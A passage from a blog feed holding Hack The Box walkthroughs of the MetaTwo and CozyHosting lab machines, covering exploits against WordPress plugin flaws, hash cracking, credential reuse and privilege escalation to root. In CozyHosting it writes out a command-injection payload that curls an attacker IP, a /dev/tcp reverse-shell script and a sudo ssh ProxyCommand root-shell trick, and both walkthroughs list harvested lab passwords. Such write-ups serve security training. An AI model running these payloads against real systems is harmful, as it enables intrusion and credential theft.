on the event page source code by searching <code>_wpnonce</code>.<br><img src="/images/MetaTwo/MT(nonce).png" alt="Wpnonce"><br>After running the poc we get:<br><img src="/images/MetaTwo/MT(poc).png" alt="POC"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|</span><br><span class="line">|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|</span><br></pre></td></tr></table></figure><h1 id="Cracking-the-hash"><a href="#Cracking-the-hash" class="headerlink" title="Cracking the hash"></a>Cracking the hash</h1><p>I run <code>hash-identifier</code> and i found that the hash is MD5(Wordpress)<br><img src="/images/MetaTwo/MT(Hash-id).png" alt="Hash-id"><br>With a quick search we find that the hashcat mode is 400 (from this website <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hashes.txt -m 400 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>Manager hash cracked</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar</span><br></pre></td></tr></table></figure><p><code>Manager:partylikearockstar </code></p><h1 id="Manager-Dashboard"><a href="#Manager-Dashboard" class="headerlink" title="Manager Dashboard"></a>Manager Dashboard</h1><p><img src="/images/MetaTwo/MT(Manager_Dash).png" alt="ManagerDash"><br>As we can see we don’t have alot of privilages to change the website but we can upload media. From the initial recon I had found the CVE-2021-29447<br><a href="https://github.com/0xRar/CVE-2021-29447-PoC">https://github.com/0xRar/CVE-2021-29447-PoC</a></p><p>We can run the poc code</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PoC.py -l 10.10.14.20 -p 8888 -f /etc/passwd</span><br></pre></td></tr></table></figure><p>and we get a base64 encoded message<br><img src="/images/MetaTwo/MT(CVE-MEDIA).png" alt="Decode"><br>we can decode that by putting it on the <code>decode.php</code> and running</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php decode.php</span><br></pre></td></tr></table></figure><p><img src="/images/MetaTwo/MT(decoding).png" alt="Decoder"><br>Now we will try to get the &#x2F;wpconfig.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PoC.py -l 10.10.14.20 -p 8888 -f ../wp-config.php</span><br></pre></td></tr></table></figure><p><img src="/images/MetaTwo/MT(Wp-config).png" alt="wp-cong"><br>After decoding it we find:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">define( &#x27;FS_METHOD&#x27;, &#x27;ftpext&#x27; );</span><br><span class="line">define( &#x27;FTP_USER&#x27;, &#x27;metapress.htb&#x27; );</span><br><span class="line">define( &#x27;FTP_PASS&#x27;, &#x27;9NYS_ii@FyL_p5M2NvJ&#x27; );</span><br><span class="line">define( &#x27;FTP_HOST&#x27;, &#x27;ftp.metapress.htb&#x27; );</span><br><span class="line">define( &#x27;FTP_BASE&#x27;, &#x27;blog/&#x27; );</span><br><span class="line">define( &#x27;FTP_SSL&#x27;, false );</span><br></pre></td></tr></table></figure><p>the ftp username and password <code>metapress.htb:9NYS_ii@FyL_p5M2NvJ</code><br>(and some db creds)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/** MySQL database username */</span><br><span class="line">define( &#x27;DB_USER&#x27;, &#x27;blog&#x27; );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( &#x27;DB_PASSWORD&#x27;, &#x27;635Aq@TdqrCwXFUZ&#x27; );</span><br></pre></td></tr></table></figure><h1 id="Ftp"><a href="#Ftp" class="headerlink" title="Ftp"></a>Ftp</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.11.186</span><br></pre></td></tr></table></figure><p>Using the creds we got <code>metapress.htb:9NYS_ii@FyL_p5M2NvJ</code> we can login to ftp. Inside the ftp we find another app that runs named <code>mailer</code>.  Inside there there is a file <code>send_email.php</code> we can download that file to our system with:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get send_email.php</span><br></pre></td></tr></table></figure><p>In there we find user and pass and another port <code>587</code> that we didnt see on nmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$mail-&gt;Host = &quot;mail.metapress.htb&quot;;</span><br><span class="line">$mail-&gt;SMTPAuth = true;                          </span><br><span class="line">$mail-&gt;Username = &quot;jnelson@metapress.htb&quot;;                 </span><br><span class="line">$mail-&gt;Password = &quot;Cb4_JmWM8zUZWMu@Ys&quot;;                           </span><br><span class="line">$mail-&gt;SMTPSecure = &quot;tls&quot;;                           </span><br><span class="line">$mail-&gt;Port = 587; </span><br></pre></td></tr></table></figure><p>We can try use those creds to login via ssh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jnelson@metapress.htb</span><br></pre></td></tr></table></figure><p>Creds worked and we have a shell as <code>jnelson</code></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>Doing <code>ls -la</code> we can see a folder that its not common on linux machines a <code>passpie</code> folder<br>that holds some keys<br>The passpie export command exports the credentials saved in passpie in plain text. <code>passpie export password.db</code> but we dont have the passphrase.</p><p>We will download our keys to our machine with:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp jnelson@metapress.htb:/home/jnelson/.passpie/.keys ./keys</span><br></pre></td></tr></table></figure><p>First let us generate the password hash from the private GPG key using gpg2john and save it into a file named keys.hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg2john keys &gt; keys.hash</span><br></pre></td></tr></table></figure><p>We can now try brute-forcing the password hash and see if we can be cracked. We can use “John The Ripper” for this purpose</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg</span><br></pre></td></tr></table></figure><p><img src="/images/MetaTwo/MT(johncrack).png" alt="John"><br>and we get <code>blink182</code> as passpi passphrase.</p><p>Now we can do</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passpie export ~/password.db</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/password.db</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">credentials:</span><br><span class="line">- comment: &#x27;&#x27;</span><br><span class="line">  fullname: root@ssh</span><br><span class="line">  login: root</span><br><span class="line">  modified: 2022-06-26 08:58:15.621572</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode &#x27;p7qfAZt4_A1xo_0x&#x27;</span><br><span class="line">- comment: &#x27;&#x27;</span><br><span class="line">  fullname: jnelson@ssh</span><br><span class="line">  login: jnelson</span><br><span class="line">  modified: 2022-06-26 08:58:15.514422</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode &#x27;Cb4_JmWM8zUZWMu@Ys&#x27;</span><br><span class="line">handler: passpie</span><br><span class="line">version: 1.0</span><br></pre></td></tr></table></figure><p>We got creds for root <code>root:p7qfAZt4_A1xo_0x</code> now we can just ssh to root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@metapress.htb</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-CozyHosting</title>
      <link href="/2024/10/31/HTB-CozyHosting/"/>
      <url>/2024/10/31/HTB-CozyHosting/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="#Nmap"></a>#Nmap</h1><p>Let’s run an Nmap scan to discover any open ports on the remote host.<br><code>sudo nmap -Pn -sC -sV -O -T3 -p- 10.10.11.230 -oN nmap_scan</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.230</span><br><span class="line">Host is up (0.054s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)</span><br><span class="line">|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://cozyhosting.htb</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:5.0</span><br><span class="line">OS details: Linux 5.0</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>Nmap shows that there are 2 ports open <code>22</code> and <code>80</code>. Also the domain is <code>cozyhosting.htb</code><br>so we add the domain to our <code>/etc/hosts</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.230 cozyhosting.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure><h1 id="Webiste"><a href="#Webiste" class="headerlink" title="#Webiste"></a>#Webiste</h1><p>Login page <a href="http://cozyhosting.htb/login">http://cozyhosting.htb/login</a></p><p>After running <code>dirsearch -u http://cozyhosting.htb/&quot;</code> we found an endpoint<br><a href="http://cozyhosting.htb/actuator">http://cozyhosting.htb/actuator</a></p><p>The endpoint revealed some good info<br><a href="http://localhost:8080/actuator/sessions">http://localhost:8080/actuator/sessions</a><br><a href="http://localhost:8080/actuator/beans">http://localhost:8080/actuator/beans</a><br><a href="http://localhost:8080/actuator/health">http://localhost:8080/actuator/health</a><br><a href="http://localhost:8080/actuator/health/%7B*path%7D">http://localhost:8080/actuator/health/{*path}</a><br><a href="http://localhost:8080/actuator/env">http://localhost:8080/actuator/env</a><br><a href="http://localhost:8080/actuator/env/%7BtoMatch%7D">http://localhost:8080/actuator/env/{toMatch}</a><br><a href="http://localhost:8080/actuator/mappings">http://localhost:8080/actuator/mappings</a></p><h1 id="Endoint-actuator-sessions"><a href="#Endoint-actuator-sessions" class="headerlink" title="#Endoint &#x2F;actuator&#x2F;sessions"></a>#Endoint &#x2F;actuator&#x2F;sessions</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;DAD1A0B9921669A3828FC1BE56330CBD&quot;:&quot;kanderson&quot;&#125;</span><br></pre></td></tr></table></figure><p>The <code>DAD1A0B9921669A3828FC1BE56330CBD</code> is the cookie for kanderson so we can change our cookie and hijack the session. After we change the cookie we can go to the &#x2F;admin panel (we can find it from the &#x2F;actuator&#x2F;mappings endpoint)</p><p><img src="/images/CozyHosting/Ch(cookie).png" alt="Cookie"></p><h1 id="Admin-Dashboard"><a href="#Admin-Dashboard" class="headerlink" title="#Admin Dashboard"></a>#Admin Dashboard</h1><p><img src="/images/CozyHosting/Ch(Adm_Pan).png" alt="Adm_Panel"></p><p>At the bottom of the page we see a form that require’s a hostname and username for<br>automatic patching. We try to submit hostname as <code>127.0.0.1</code> and username as <code>test</code> but we get an error “Host key verification failed.”</p><p><img src="/images/CozyHosting/Ch(Form).png" alt="Form"></p><p>Probably this means that a service attempts to use ssh to connect to the hostname and username we provide above. As we don’t need to provide any passwords it uses a id_rsa so the command that the service runs is “ssh -i id_rsa username@hostname”</p><p>After some testing I found out that the username does not allow spaces but we can use ${IFS} to bypass that. A simple way to see if the command injection works it to curl a python server that we will host</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure><p>Then we will try to curl our python server and see if we get a callback<br><code>test;curl$&#123;IFS&#125;http://10.10.14.15:8888;</code></p><p><img src="/images/CozyHosting/Ch(Form_Curl).png" alt="Curl Form"><br><img src="/images/CozyHosting/Ch(Callback).png" alt="Call_Back"></p><p>Now we can generate a shell and upload it to the machine</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash\nsh -i &gt;&amp; /dev/tcp/10.10.14.15/1234 0&gt;&amp;1&#x27; &gt; rev.sh</span><br></pre></td></tr></table></figure><p>after creating the rev.sh and our python server is running we start out netcat listener</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure><p><img src="/images/CozyHosting/Ch(Form_Shell).png" alt="Curl_Shell"></p><p>And we execute a curl command pointing to the rev.sh we created<br>We got a shell, we can upgrade our shell with running</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/CozyHosting/Ch(Shell_App).png" alt="Shell_APP"></p><h1 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="#Lateral Movement"></a>#Lateral Movement</h1><p>We extract the .jar to tmp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -d /tmp/app cloudhosting-0.0.1.jar</span><br></pre></td></tr></table></figure><p>Inside there after some searching around we can find a application.properties that reveals credentials for a postgresql database.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server.address=127.0.0.1</span><br><span class="line">server.servlet.session.timeout=5m</span><br><span class="line">management.endpoints.web.exposure.include=health,beans,env,sessions,mappings</span><br><span class="line">management.endpoint.sessions.enabled = true</span><br><span class="line">spring.datasource.driver-class-name=org.postgresql.Driver</span><br><span class="line">spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect</span><br><span class="line">spring.jpa.hibernate.ddl-auto=none</span><br><span class="line">spring.jpa.database=POSTGRESQL</span><br><span class="line">spring.datasource.platform=postgres</span><br><span class="line">spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting</span><br><span class="line">spring.datasource.username=postgres</span><br><span class="line">spring.datasource.password=Vg&amp;nvzAQ7XxR</span><br></pre></td></tr></table></figure><p>We can see that a postgresql is running on 5432 and we have creds <code>postgres:Vg&amp;nvzAQ7XxR</code>. Using the command <code>psql -h 127.0.0.1 -U postgres</code> to log in we use <code>\list</code> to list all of the database and we see a <code>cozyhosting</code> that looks interesting so we connect to it</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\connect cozyhosting</span><br></pre></td></tr></table></figure><p>There are 2 tables one with users and one with hosts we use a simple command to dump the users table.</p><p><img src="/images/CozyHosting/Ch(Tables).png" alt="Tables"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure><p>The admin hash is <code>$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm</code></p><h1 id="Cracking-The-hash"><a href="#Cracking-The-hash" class="headerlink" title="#Cracking The hash"></a>#Cracking The hash</h1><p>To identify the hash we use <code>hashid $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm</code> or <code>hash-identifier</code> the hash it a bcrypt so after looking for the correct hashcat mode<br>we save the hash into a file and use hashcat with mode <code>3200</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash -m 3200 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/images/CozyHosting/Ch(Hashcat).png" alt="Hashcat"><br>The hash cracked to <code>manchesterunited</code> and in the home directory we have seen a user <code>josh</code> so we will try to ssh with josh and <code>manchesterunited</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh josh@10.10.11.230</span><br></pre></td></tr></table></figure><p>the flag is on <code>/home/josh/user.txt</code></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="#Privilege Escalation"></a>#Privilege Escalation</h1><p>We run <code>sudo -l</code> and provided the <code>manchesterunited</code> as password and we see that we can execute the <code>/usr/bin/ssh</code> with sudo.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User josh may run the following commands on localhost:</span><br><span class="line">    (root) /usr/bin/ssh *</span><br><span class="line">with root priv </span><br></pre></td></tr></table></figure><p>After a quick search on gtfo bins <a href="https://gtfobins.github.io/gtfobins/ssh/">https://gtfobins.github.io/gtfobins/ssh/</a> we found that we can run:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -o ProxyCommand=&#x27;;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; x</span><br></pre></td></tr></table></figure><p>and get a root shell, the flag is on <code>/root/root.txt</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
